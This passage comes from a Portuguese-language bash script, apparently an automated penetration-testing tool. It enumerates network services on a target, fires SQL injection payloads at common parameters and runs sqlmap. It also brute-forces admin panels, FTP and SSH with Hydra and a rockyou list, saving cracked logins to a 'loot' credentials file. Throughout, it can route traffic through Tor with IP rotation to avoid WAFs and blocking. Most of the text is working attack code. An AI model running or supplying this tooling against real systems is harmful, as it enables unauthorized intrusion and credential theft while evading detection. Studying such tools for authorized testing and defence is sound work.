}

enumerate_smtp() {
    local port=$1
    log "INFO" "Enumerando SMTP (porta $port)..."
    
    # NSE scripts para SMTP
    nmap --script smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln* -p "$port" "$TARGET" -oN "${OUTPUT_DIR}/scanning/smtp_enum.txt" > /dev/null 2>&1
    
    # Verificar open relay
    if grep -q "Open relay" "${OUTPUT_DIR}/scanning/smtp_enum.txt"; then
        log "VULN" "SMTP configurado como Open Relay!"
        VULN_HIGH=$((VULN_HIGH + 1))
        VULNERABILITIES+=("SMTP Open Relay (Port $port)")
    fi
    
    # Enum users se tiver wordlist
    if command -v smtp-user-enum &> /dev/null && [[ -f "${SECLISTS}/Usernames/top-usernames-shortlist.txt" ]]; then
        log "INFO" "Tentando enumerar usuÃ¡rios SMTP..."
        smtp-user-enum -M VRFY -U "${SECLISTS}/Usernames/top-usernames-shortlist.txt" -t "$TARGET" -p "$port" > "${OUTPUT_DIR}/scanning/smtp_users.txt" 2>&1
    fi
    
    log "SUCCESS" "EnumeraÃ§Ã£o SMTP concluÃ­da"
}

enumerate_dns() {
    local port=$1
    log "INFO" "Enumerando DNS (porta $port)..."
    
    # NSE scripts para DNS
    nmap --script dns-zone-transfer,dns-recursion,dns-cache-snoop -p "$port" "$TARGET" -oN "${OUTPUT_DIR}/scanning/dns_enum.txt" > /dev/null 2>&1
    
    # Zone transfer
    if grep -q "AXFR" "${OUTPUT_DIR}/scanning/dns_enum.txt"; then
        log "VULN" "DNS Zone Transfer habilitado!"
        VULN_CRITICAL=$((VULN_CRITICAL + 1))
        VULNERABILITIES+=("DNS Zone Transfer Enabled (Port $port)")
    fi
    
    log "SUCCESS" "EnumeraÃ§Ã£o DNS concluÃ­da"
}

enumerate_http() {
    local port=$1
    local protocol=$2
    local url="${protocol}://${TARGET}:${port}"
    
    log "INFO" "Enumerando HTTP/HTTPS (porta $port)..."
    
    # WhatWeb (identificar tecnologias)
    if command -v whatweb &> /dev/null; then
        log "INFO" "Identificando tecnologias web (WhatWeb)..."
        run_with_opsec whatweb -v "$url" > "${OUTPUT_DIR}/web/whatweb_${port}.txt" 2>&1
        log "SUCCESS" "WhatWeb concluÃ­do"
    fi
    
    # WAF Detection
    if command -v wafw00f &> /dev/null; then
        log "INFO" "Detectando WAF..."
        run_with_opsec wafw00f "$url" > "${OUTPUT_DIR}/web/waf_${port}.txt" 2>&1
        if grep -q "detected" "${OUTPUT_DIR}/web/waf_${port}.txt"; then
            log "WARNING" "WAF detectado! Cuidado com rate limiting."
            log "INFO" "RotaÃ§Ã£o de IP Tor ativa ajudarÃ¡ a evitar bloqueios"
        fi
    fi
    
    # Nikto scan
    if command -v nikto &> /dev/null; then
        log "INFO" "Executando Nikto scan..."
        if [[ "$USE_TOR_ROTATION" == true ]]; then
            proxychains4 -q nikto -h "$url" -output "${OUTPUT_DIR}/web/nikto_${port}.txt" > /dev/null 2>&1 &
        else
            nikto -h "$url" -output "${OUTPUT_DIR}/web/nikto_${port}.txt" > /dev/null 2>&1 &
        fi
        log "INFO" "Nikto executando em background"
    fi
    
    # Directory bruteforce com Gobuster
    if command -v gobuster &> /dev/null; then
        log "INFO" "Iniciando directory bruteforce (Gobuster)..."
        
        local wordlist="${SECLISTS}/Discovery/Web-Content/common.txt"
        if [[ ! -f "$wordlist" ]]; then
            wordlist="/usr/share/wordlists/dirb/common.txt"
        fi
        
        if [[ -f "$wordlist" ]]; then
            if [[ "$USE_TOR_ROTATION" == true ]]; then
                proxychains4 -q gobuster dir -u "$url" -w "$wordlist" -o "${OUTPUT_DIR}/web/gobuster_${port}.txt" --quiet -t 10 2>/dev/null &
            else
                gobuster dir -u "$url" -w "$wordlist" -o "${OUTPUT_DIR}/web/gobuster_${port}.txt" --quiet -t 20 2>/dev/null &
            fi
            log "INFO" "Gobuster executando em background"
        fi
    fi
    
    # Dirb (alternativa)
    if command -v dirb &> /dev/null; then
        log "INFO" "Iniciando directory bruteforce (Dirb)..."
        if [[ "$USE_TOR_ROTATION" == true ]]; then
            proxychains4 -q dirb "$url" /usr/share/wordlists/dirb/common.txt -o "${OUTPUT_DIR}/web/dirb_${port}.txt" -S -r > /dev/null 2>&1 &
        else
            dirb "$url" /usr/share/wordlists/dirb/common.txt -o "${OUTPUT_DIR}/web/dirb_${port}.txt" -S -r > /dev/null 2>&1 &
        fi
        log "INFO" "Dirb executando em background"
    fi
    
    # WordPress scan se detectado
    local is_wordpress=false
    if [[ "$USE_TOR_ROTATION" == true ]]; then
        is_wordpress=$(proxychains4 -q curl -s "$url" | grep -q "wp-content\|wp-includes\|wordpress" && echo "true" || echo "false")
    else
        is_wordpress=$(curl -s "$url" | grep -q "wp-content\|wp-includes\|wordpress" && echo "true" || echo "false")
    fi
    
    if [[ "$is_wordpress" == "true" ]]; then
        log "INFO" "WordPress detectado! Executando WPScan..."
        
        if command -v wpscan &> /dev/null; then
            if [[ "$USE_TOR_ROTATION" == true ]]; then
                proxychains4 -q wpscan --url "$url" --enumerate ap,at,cb,dbe --random-user-agent -o "${OUTPUT_DIR}/web/wpscan_${port}.txt" > /dev/null 2>&1 &
            else
                wpscan --url "$url" --enumerate ap,at,cb,dbe --random-user-agent -o "${OUTPUT_DIR}/web/wpscan_${port}.txt" > /dev/null 2>&1 &
            fi
            log "INFO" "WPScan executando em background"
            VULN_INFO=$((VULN_INFO + 1))
        fi
    fi
    
    # Verificar robots.txt
    log "INFO" "Verificando robots.txt..."
    run_with_opsec curl -s "${url}/robots.txt" > "${OUTPUT_DIR}/web/robots_${port}.txt" 2>&1
    if [[ -s "${OUTPUT_DIR}/web/robots_${port}.txt" ]] && ! grep -q "404\|Not Found" "${OUTPUT_DIR}/web/robots_${port}.txt"; then
        log "SUCCESS" "robots.txt encontrado!"
        VULN_INFO=$((VULN_INFO + 1))
    fi
    
    # Verificar arquivos sensÃ­veis comuns
    log "INFO" "Procurando arquivos sensÃ­veis..."
    local sensitive_files=(
        "/.git/config"
        "/.env"
        "/config.php"
        "/phpinfo.php"
        "/admin"
        "/login"
        "/dashboard"
        "/backup.sql"
        "/backup.zip"
        "/.DS_Store"
    )
    
    for file in "${sensitive_files[@]}"; do
        local status=$(run_with_opsec curl -s -o /dev/null -w "%{http_code}" "${url}${file}")
        if [[ "$status" == "200" ]]; then
            log "VULN" "Arquivo sensÃ­vel exposto: ${file} (HTTP $status)"
            VULN_MEDIUM=$((VULN_MEDIUM + 1))
            VULNERABILITIES+=("Sensitive File Exposed: ${url}${file}")
            echo "${url}${file}" >> "${OUTPUT_DIR}/web/sensitive_files.txt"
        fi
        
        # Pequeno delay para evitar rate limiting
        sleep 0.5
    done
    
    # SQL Injection test bÃ¡sico
    log "INFO" "Testando SQL Injection em parÃ¢metros comuns..."
    test_sqli "$url"
    
    log "SUCCESS" "EnumeraÃ§Ã£o HTTP/HTTPS iniciada (continuando em background)"
}

test_sqli() {
    local base_url=$1
    local sqli_payloads=(
        "'"
        "1' OR '1'='1"
        "admin' --"
        "' OR 1=1--"
    )
    
    # Testar parÃ¢metros comuns
    local params=("id" "user" "page" "search" "query")
    
    for param in "${params[@]}"; do
        for payload in "${sqli_payloads[@]}"; do
            local test_url="${base_url}?${param}=${payload}"
            local response=$(run_with_opsec curl -s "$test_url" 2>&1)
            
            # Procurar por erros SQL
            if echo "$response" | grep -qiE "SQL|mysql|syntax|error in your SQL|MariaDB|PostgreSQL|Oracle"; then
                log "VULN" "PossÃ­vel SQL Injection em: ${test_url}"
                VULN_CRITICAL=$((VULN_CRITICAL + 1))
                VULNERABILITIES+=("Possible SQL Injection: ${test_url}")
                echo "$test_url" >> "${OUTPUT_DIR}/web/sqli_candidates.txt"
                break
            fi
            
            # Delay entre testes
            sleep 0.5
        done
    done
}

enumerate_smb() {
    local port=$1
    log "INFO" "Enumerando SMB (porta $port)..."
    
    # Enum4linux
    if command -v enum4linux &> /dev/null; then
        log "INFO" "Executando enum4linux..."
        enum4linux -a "$TARGET" > "${OUTPUT_DIR}/scanning/enum4linux.txt" 2>&1
        
        # Verificar null session
        if grep -q "NULL SESSION" "${OUTPUT_DIR}/scanning/enum4linux.txt"; then
            log "VULN" "SMB permite NULL SESSION!"
            VULN_HIGH=$((VULN_HIGH + 1))
            VULNERABILITIES+=("SMB NULL Session Enabled (Port $port)")
        fi
        
        log "SUCCESS" "enum4linux concluÃ­do"
    fi
    
    # NSE scripts para SMB
    nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln* -p "$port" "$TARGET" -oN "${OUTPUT_DIR}/scanning/smb_nse.txt" > /dev/null 2>&1
    
    # Verificar EternalBlue
    if grep -q "MS17-010" "${OUTPUT_DIR}/scanning/smb_nse.txt"; then
        log "VULN" "CRÃTICO: Sistema vulnerÃ¡vel a EternalBlue (MS17-010)!"
        VULN_CRITICAL=$((VULN_CRITICAL + 1))
        VULNERABILITIES+=("MS17-010 EternalBlue (CRITICAL - Port $port)")
    fi
    
    # SMBClient - listar shares
    if command -v smbclient &> /dev/null; then
        log "INFO" "Listando SMB shares..."
        smbclient -L "//${TARGET}" -N > "${OUTPUT_DIR}/scanning/smb_shares.txt" 2>&1
        
        # Tentar acessar shares sem credenciais
        if grep -q "Sharename" "${OUTPUT_DIR}/scanning/smb_shares.txt"; then
            while read -r share; do
                if [[ $share =~ Disk ]]; then
                    local sharename=$(echo "$share" | awk '{print $1}')
                    log "INFO" "Tentando acessar share: $sharename"
                    smbclient "//${TARGET}/${sharename}" -N -c "ls" > "${OUTPUT_DIR}/scanning/smb_${sharename}.txt" 2>&1
                fi
            done < <(grep "Disk" "${OUTPUT_DIR}/scanning/smb_shares.txt")
        fi
    fi
    
    log "SUCCESS" "EnumeraÃ§Ã£o SMB concluÃ­da"
}

enumerate_snmp() {
    local port=$1
    log "INFO" "Enumerando SNMP (porta $port)..."
    
    # SNMP check
    if command -v snmp-check &> /dev/null; then
        log "INFO" "Executando snmp-check..."
        snmp-check "$TARGET" > "${OUTPUT_DIR}/scanning/snmp_check.txt" 2>&1
        
        if [[ -s "${OUTPUT_DIR}/scanning/snmp_check.txt" ]]; then
            log "SUCCESS" "SNMP respondeu! Dados coletados."
            VULN_MEDIUM=$((VULN_MEDIUM + 1))
            VULNERABILITIES+=("SNMP Service Exposed (Port $port)")
        fi
    fi
    
    # onesixtyone (community string bruteforce)
    if command -v onesixtyone &> /dev/null && [[ -f "${SECLISTS}/Discovery/SNMP/common-snmp-community-strings.txt" ]]; then
        log "INFO" "Bruteforce de community strings..."
        onesixtyone -c "${SECLISTS}/Discovery/SNMP/common-snmp-community-strings.txt" "$TARGET" > "${OUTPUT_DIR}/scanning/snmp_bruteforce.txt" 2>&1
    fi
    
    log "SUCCESS" "EnumeraÃ§Ã£o SNMP concluÃ­da"
}

enumerate_ldap() {
    local port=$1
    log "INFO" "Enumerando LDAP (porta $port)..."
    
    # NSE scripts para LDAP
    nmap --script ldap-search,ldap-rootdse,ldap-brute -p "$port" "$TARGET" -oN "${OUTPUT_DIR}/scanning/ldap_enum.txt" > /dev/null 2>&1
    
    log "SUCCESS" "EnumeraÃ§Ã£o LDAP concluÃ­da"
}

enumerate_mysql() {
    local port=$1
    log "INFO" "Enumerando MySQL (porta $port)..."
    
    # NSE scripts para MySQL
    nmap --script mysql-enum,mysql-info,mysql-databases,mysql-vuln* -p "$port" "$TARGET" -oN "${OUTPUT_DIR}/scanning/mysql_enum.txt" > /dev/null 2>&1
    
    # Verificar acesso root sem senha
    if command -v mysql &> /dev/null; then
        log "INFO" "Testando acesso MySQL sem senha..."
        mysql -h "$TARGET" -u root -e "show databases;" > "${OUTPUT_DIR}/scanning/mysql_root_nopass.txt" 2>&1
        
        if [[ $? -eq 0 ]]; then
            log "VULN" "MySQL permite acesso root SEM SENHA!"
            VULN_CRITICAL=$((VULN_CRITICAL + 1))
            VULNERABILITIES+=("MySQL Root No Password (CRITICAL - Port $port)")
        fi
    fi
    
    log "SUCCESS" "EnumeraÃ§Ã£o MySQL concluÃ­da"
}

enumerate_postgresql() {
    local port=$1
    log "INFO" "Enumerando PostgreSQL (porta $port)..."
    
    # NSE scripts para PostgreSQL
    nmap --script pgsql-brute -p "$port" "$TARGET" -oN "${OUTPUT_DIR}/scanning/postgresql_enum.txt" > /dev/null 2>&1
    
    log "SUCCESS" "EnumeraÃ§Ã£o PostgreSQL concluÃ­da"
}

enumerate_rdp() {
    local port=$1
    log "INFO" "Enumerando RDP (porta $port)..."
    
    # NSE scripts para RDP
    nmap --script rdp-enum-encryption,rdp-vuln* -p "$port" "$TARGET" -oN "${OUTPUT_DIR}/scanning/rdp_enum.txt" > /dev/null 2>&1
    
    # Verificar BlueKeep
    if grep -q "CVE-2019-0708" "${OUTPUT_DIR}/scanning/rdp_enum.txt"; then
        log "VULN" "CRÃTICO: Sistema vulnerÃ¡vel a BlueKeep (CVE-2019-0708)!"
        VULN_CRITICAL=$((VULN_CRITICAL + 1))
        VULNERABILITIES+=("CVE-2019-0708 BlueKeep (CRITICAL - Port $port)")
    fi
    
    log "SUCCESS" "EnumeraÃ§Ã£o RDP concluÃ­da"
}

enumerate_generic() {
    local port=$1
    
    # Banner grabbing
    nc -vn -w 2 "$TARGET" "$port" < /dev/null > "${OUTPUT_DIR}/scanning/banner_${port}.txt" 2>&1
}

################################################################################
# FASE 4: EXPLORAÃ‡ÃƒO
################################################################################

phase_exploitation() {
    echo ""
    log "INFO" "${BOLD}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    log "INFO" "FASE 4: EXPLORAÃ‡ÃƒO AUTOMATIZADA"
    log "INFO" "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    
    # Aguardar scans em background finalizarem
    log "INFO" "Aguardando scans em background finalizarem..."
    wait
    
    # SQL Injection com SQLMap
    if [[ -f "${OUTPUT_DIR}/web/sqli_candidates.txt" ]]; then
        log "INFO" "Explorando SQL Injection com SQLMap..."
        
        while IFS= read -r sqli_url; do
            log "INFO" "SQLMap testando: $sqli_url (via Tor: $USE_TOR_ROTATION)"
            log "INFO" "IP atual: $(get_current_ip)"
            
            if command -v sqlmap &> /dev/null; then
                if [[ "$USE_TOR_ROTATION" == true ]]; then
                    sqlmap -u "$sqli_url" --batch --random-agent --level=1 --risk=1 --tor --tor-type=SOCKS5 --tor-port=9050 --check-tor --output-dir="${OUTPUT_DIR}/exploitation/sqlmap" > /dev/null 2>&1 &
                else
                    sqlmap -u "$sqli_url" --batch --random-agent --level=1 --risk=1 --output-dir="${OUTPUT_DIR}/exploitation/sqlmap" > /dev/null 2>&1 &
                fi
            fi
        done < "${OUTPUT_DIR}/web/sqli_candidates.txt"
    fi
    
    # Brute force em painÃ©is administrativos
    bruteforce_admin_panels
    
    # Brute force FTP se detectado
    if grep -q "21/tcp.*open" "${OUTPUT_DIR}/scanning/service_detection.txt"; then
        bruteforce_ftp
    fi
    
    # Brute force SSH se detectado
    if grep -q "22/tcp.*open" "${OUTPUT_DIR}/scanning/service_detection.txt"; then
        bruteforce_ssh
    fi
    
    # Exploit de vulnerabilidades conhecidas
    exploit_known_vulns
    
    log "SUCCESS" "Fase de exploraÃ§Ã£o concluÃ­da"
}

bruteforce_admin_panels() {
    log "INFO" "Procurando painÃ©is administrativos..."
    
    # Verificar se encontrou diretÃ³rios /admin, /login, etc
    local admin_paths=()
    
    if [[ -f "${OUTPUT_DIR}/web/gobuster_80.txt" ]]; then
        admin_paths+=($(grep -E "/admin|/login|/dashboard|/wp-admin|/administrator" "${OUTPUT_DIR}/web/gobuster_80.txt" | awk '{print $1}' | grep -v "403"))
    fi
    
    if [[ -f "${OUTPUT_DIR}/web/dirb_80.txt" ]]; then
        admin_paths+=($(grep -E "/admin|/login|/dashboard|/wp-admin|/administrator" "${OUTPUT_DIR}/web/dirb_80.txt" | awk '{print $1}' | grep -v "403"))
    fi
    
    if [[ ${#admin_paths[@]} -gt 0 ]]; then
        log "INFO" "PainÃ©is administrativos encontrados: ${#admin_paths[@]}"
        
        for panel in "${admin_paths[@]}"; do
            log "INFO" "Tentando brute force em: $panel"
            
            # Determinar se Ã© GET ou POST
            local url="http://${TARGET}${panel}"
            
            # Usar Hydra para brute force HTTP
            if command -v hydra &> /dev/null && [[ -f "/usr/share/wordlists/rockyou.txt" ]]; then
                log "INFO" "Hydra bruteforce iniciado em: $url"
                
                # Pegar apenas as primeiras 100 senhas do rockyou (para nÃ£o demorar muito)
                head -n 100 /usr/share/wordlists/rockyou.txt > "${OUTPUT_DIR}/passwords/top100.txt"
                
                # Testar usuÃ¡rios comuns
                local users=("admin" "administrator" "root" "user")
                
                for user in "${users[@]}"; do
                    timeout 60 hydra -l "$user" -P "${OUTPUT_DIR}/passwords/top100.txt" "$TARGET" http-post-form "${panel}:username=^USER^&password=^PASS^:F=incorrect" -t 4 > "${OUTPUT_DIR}/passwords/hydra_${panel//\//_}_${user}.txt" 2>&1 &
                done
            fi
        done
    fi
}

bruteforce_ftp() {
    log "INFO" "Iniciando brute force FTP..."
    log "INFO" "IP de ataque: $(get_current_ip)"
    
    if command -v hydra &> /dev/null && [[ -f "${OUTPUT_DIR}/passwords/top100.txt" ]]; then
        # UsuÃ¡rios comuns FTP
        local ftp_users=("admin" "ftp" "anonymous" "root")
        
        for user in "${ftp_users[@]}"; do
            log "INFO" "Testando FTP com usuÃ¡rio: $user (via Tor: $USE_TOR_ROTATION)"
            
            if [[ "$USE_TOR_ROTATION" == true ]]; then
                timeout 60 proxychains4 -q hydra -l "$user" -P "${OUTPUT_DIR}/passwords/top100.txt" ftp://"$TARGET" -t 2 > "${OUTPUT_DIR}/passwords/hydra_ftp_${user}.txt" 2>&1
            else
                timeout 60 hydra -l "$user" -P "${OUTPUT_DIR}/passwords/top100.txt" ftp://"$TARGET" -t 4 > "${OUTPUT_DIR}/passwords/hydra_ftp_${user}.txt" 2>&1
            fi
            
            # Verificar se encontrou senha
            if grep -q "login:" "${OUTPUT_DIR}/passwords/hydra_ftp_${user}.txt"; then
                log "VULN" "Credenciais FTP encontradas!"
                VULN_CRITICAL=$((VULN_CRITICAL + 1))
                VULNERABILITIES+=("FTP Credentials Cracked")
                grep "login:" "${OUTPUT_DIR}/passwords/hydra_ftp_${user}.txt" >> "${OUTPUT_DIR}/loot/credentials.txt"
            fi
        done
    fi
}

bruteforce_ssh() {
    log "INFO" "Iniciando brute force SSH (limitado para evitar bloqueio)..."
    log "INFO" "IP de ataque: $(get_current_ip)"
    
    if command -v hydra &> /dev/null && [[ -f "${OUTPUT_DIR}/passwords/top100.txt" ]]; then
        # Apenas alguns usuÃ¡rios comuns (para nÃ£o travar a conta)
        local ssh_users=("root" "admin" "ubuntu")
        
        for user in "${ssh_users[@]}"; do
            log "INFO" "Testando SSH com usuÃ¡rio: $user (apenas top 20 senhas, via Tor: $USE_TOR_ROTATION)"
            head -n 20 "${OUTPUT_DIR}/passwords/top100.txt" > "${OUTPUT_DIR}/passwords/top20.txt"
            
            if [[ "$USE_TOR_ROTATION" == true ]]; then
                timeout 60 proxychains4 -q hydra -l "$user" -P "${OUTPUT_DIR}/passwords/top20.txt" ssh://"$TARGET" -t 1 > "${OUTPUT_DIR}/passwords/hydra_ssh_${user}.txt" 2>&1
            else
                timeout 60 hydra -l "$user" -P "${OUTPUT_DIR}/passwords/top20.txt" ssh://"$TARGET" -t 2 > "${OUTPUT_DIR}/passwords/hydra_ssh_${user}.txt" 2>&1
            fi
            
            # Verificar se encontrou senha
            if grep -q "login:" "${OUTPUT_DIR}/passwords/hydra_ssh_${user}.txt"; then
                log "VULN" "Credenciais SSH encontradas!"
                VULN_CRITICAL=$((VULN_CRITICAL + 1))
                VULNERABILITIES+=("SSH Credentials Cracked")
                grep "login:" "${OUTPUT_DIR}/passwords/hydra_ssh_${user}.txt" >> "${OUTPUT_DIR}/loot/credentials.txt"
            fi
        done
    fi
}

exploit_known_vulns() {
    log "INFO" "Verificando exploits conhecidos (via Searchsploit)..."
    
    # Extrair versÃµes de serviÃ§os
    if [[ -f "${OUTPUT_DIR}/scanning/service_detection.txt" ]]; then
        while IFS= read -r line; do
            if [[ $line =~ ([a-zA-Z]+)[[:space:]]+([0-9.]+) ]]; then
                local service="${BASH_REMATCH[1]}"
                local version="${BASH_REMATCH[2]}"
                
                # Procurar exploits
                if command -v searchsploit &> /dev/null; then
                    searchsploit "$service $version" > "${OUTPUT_DIR}/exploitation/searchsploit_${service}_${version}.txt" 2>&1
                    
                    if [[ -s "${OUTPUT_DIR}/exploitation/searchsploit_${service}_${version}.txt" ]]; then
                        local exploit_count=$(grep -c "^" "${OUTPUT_DIR}/exploitation/searchsploit_${service}_${version}.txt")
                        if [[ $exploit_count -gt 0 ]]; then
                            log "VULN" "Encontrados exploits para $service $version"
                            VULN_HIGH=$((VULN_HIGH + 1))
                            VULNERABILITIES+=("Public Exploits Available: $service $version")
                        fi
                    fi
                fi
            fi
        done < <(grep "^[0-9]*/tcp" "${OUTPUT_DIR}/scanning/service_detection.txt")
    fi
}

################################################################################
# FASE 5: ANÃLISE E RELATÃ“RIO
################################################################################

phase_reporting() {
    echo ""
    log "INFO" "${BOLD}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    log "INFO" "FASE 5: GERAÃ‡ÃƒO DE RELATÃ“RIO FINAL"
    log "INFO" "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    
    log "INFO" "Compilando resultados..."
    
    # Aguardar processos em background finalizarem
    wait
    
    # Criar relatÃ³rio final
    generate_final_report
    
    log "SUCCESS" "RelatÃ³rio final gerado!"
}

generate_final_report() {
    cat > "$FINAL_REPORT" << EOF
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                    RELATÃ“RIO DE PENETRATION TEST AUTOMATIZADO
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Data/Hora: $(date)
Target: ${TARGET}
Executado por: Pentest Automatizado v3.0

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
1. SUMÃRIO EXECUTIVO
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Total de Vulnerabilidades Encontradas:
  - CRÃTICAS:  ${VULN_CRITICAL}
  - ALTAS:     ${VULN_HIGH}
  - MÃ‰DIAS:    ${VULN_MEDIUM}
  - BAIXAS:    ${VULN_LOW}
  - INFO:      ${VULN_INFO}

TOTAL: $((VULN_CRITICAL + VULN_HIGH + VULN_MEDIUM + VULN_LOW + VULN_INFO))

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
2. PORTAS ABERTAS E SERVIÃ‡OS
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

EOF

    # Adicionar portas abertas
    if [[ -f "${OUTPUT_DIR}/scanning/service_detection.txt" ]]; then
        grep "^[0-9]*/tcp.*open" "${OUTPUT_DIR}/scanning/service_detection.txt" >> "$FINAL_REPORT"
    fi
    
    cat >> "$FINAL_REPORT" << EOF

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
3. VULNERABILIDADES IDENTIFICADAS
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

EOF

    # Listar vulnerabilidades
    if [[ ${#VULNERABILITIES[@]} -gt 0 ]]; then
        local counter=1
        for vuln in "${VULNERABILITIES[@]}"; do
            echo "[$counter] $vuln" >> "$FINAL_REPORT"
            counter=$((counter + 1))
        done
    else
        echo "Nenhuma vulnerabilidade crÃ­tica identificada automaticamente." >> "$FINAL_REPORT"
    fi
    
    cat >> "$FINAL_REPORT" << EOF

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
4. INFORMAÃ‡Ã•ES COLETADAS (OSINT)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

EOF

    # Adicionar informaÃ§Ãµes de WHOIS
    if [[ -f "${OUTPUT_DIR}/recon/whois.txt" ]]; then
        echo "--- WHOIS Information ---" >> "$FINAL_REPORT"
        head -n 20 "${OUTPUT_DIR}/recon/whois.txt" >> "$FINAL_REPORT"
        echo "" >> "$FINAL_REPORT"
    fi
    
    # Adicionar subdomÃ­nios encontrados
    if [[ -f "${OUTPUT_DIR}/recon/subdomains.txt" ]]; then
        echo "--- SubdomÃ­nios Encontrados ---" >> "$FINAL_REPORT"
        cat "${OUTPUT_DIR}/recon/subdomains.txt" >> "$FINAL_REPORT"
        echo "" >> "$FINAL_REPORT"
    fi
    
    cat >> "$FINAL_REPORT" << EOF

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
5. EXPLORAÃ‡ÃƒO E CREDENCIAIS
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

EOF

    # Adicionar credenciais encontradas
    if [[ -f "${OUTPUT_DIR}/loot/credentials.txt" ]]; then
        echo "âš ï¸ CREDENCIAIS ENCONTRADAS:" >> "$FINAL_REPORT"
        cat "${OUTPUT_DIR}/loot/credentials.txt" >> "$FINAL_REPORT"
        echo "" >> "$FINAL_REPORT"
    else
        echo "Nenhuma credencial foi obtida durante o teste automatizado." >> "$FINAL_REPORT"
    fi
    
    # Adicionar arquivos sensÃ­veis
    if [[ -f "${OUTPUT_DIR}/web/sensitive_files.txt" ]]; then
        echo "" >> "$FINAL_REPORT"
        echo "âš ï¸ ARQUIVOS SENSÃVEIS EXPOSTOS:" >> "$FINAL_REPORT"
        cat "${OUTPUT_DIR}/web/sensitive_files.txt" >> "$FINAL_REPORT"
    fi
    
    cat >> "$FINAL_REPORT" << EOF

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
6. RECOMENDAÃ‡Ã•ES
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

EOF

    # Gerar recomendaÃ§Ãµes baseadas nas vulnerabilidades
    if [[ $VULN_CRITICAL -gt 0 ]]; then
